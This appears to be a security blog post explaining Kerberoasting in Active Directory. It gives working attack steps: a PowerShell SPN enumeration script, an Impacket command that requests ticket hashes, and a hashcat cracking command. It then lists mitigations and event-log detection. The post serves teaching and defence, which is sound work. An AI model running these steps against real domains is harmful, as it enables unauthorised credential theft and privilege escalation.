---
title: "Practical Active Directory Security: Kerberoasting Mechanics & Prevention"
slug: "practical-guide-to-active-directory-kerberoasting"
excerpt: "Understanding how low-privileged domain users can request TGS tickets for SPNs and perform offline brute-force attacks against service account passwords."
date: "2024-02-18"
author: "Rahul"
category: "Infrastructure Security"
tags: ["Active Directory", "Kerberos", "Red Teaming", "Windows Security", "Privilege Escalation"]
readingTime: "7 min read"
featuredImage: "/images/cert.png"
featured: true
---

### Introduction

**Kerberoasting** remains one of the most effective post-exploitation techniques in Windows Active Directory environments. Because the Kerberos protocol allows any authenticated domain user to request a Ticket Granting Service (TGS) ticket for any account with a registered Service Principal Name (SPN), attackers can extract ticket hashes without sending suspicious traffic to target endpoints.

In this technical post, we break down the underlying Kerberos ticket exchange mechanics, offline hash cracking, and detection strategies.

---

### Kerberos Protocol Exchange Mechanics

1. **AS-REQ / AS-REP**: The user authenticates to the Key Distribution Center (KDC) and receives a Ticket Granting Ticket (TGT).
2. **TGS-REQ**: The authenticated domain user requests a TGS ticket for a specific service account by specifying its SPN (`MSSQLSvc/db01.corp.local:1433`).
3. **TGS-REP**: The KDC issues a TGS ticket encrypted with the **service account's NTLM hash**.

Because the TGS ticket is encrypted using the target service account's secret key, any user who receives the TGS-REP payload can attempt offline dictionary attacks to reveal the plain-text password.

---

### Executing the Audit via PowerShell / Impacket

#### Querying SPNs with PowerShell (GetUserSPNs)

```powershell
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$results = $searcher.FindAll()

foreach ($result in $results) {
    Write-Host "[+] Found SPN:" $result.Properties["serviceprincipalname"] "for user:" $result.Properties["samaccountname"]
}
```

#### Extracting Tickets using Impacket

```bash
GetUserSPNs.py corp.local/jdoe:Password123! -dc-ip 192.168.1.10 -request -outputfile roasted_hashes.txt
```

---

### Offline Cracking with Hashcat

Once extracted, ticket hashes (Hashcat mode `13100` for Kerberos 5 TGS-REP etype 23) can be cracked offline:

```bash
hashcat -m 13100 -a 0 roasted_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

---

### Defensive Mitigation & Detection Strategies

1. **Group Managed Service Accounts (gMSA)**: Migrate legacy user accounts running services to gMSAs. gMSAs feature 128-character complex passwords that are automatically rotated by Windows and cannot be cracked offline.
2. **Enforce 25+ Character Passwords**: If gMSAs cannot be used, ensure service account passwords exceed 25 characters in length.
3. **Event Log Monitoring**: Monitor Domain Controller Event Logs for **Event ID 4769** ("A Kerberos service ticket was requested") with ticket encryption type `0x17` (RC4-HMAC) requested by non-standard user accounts.
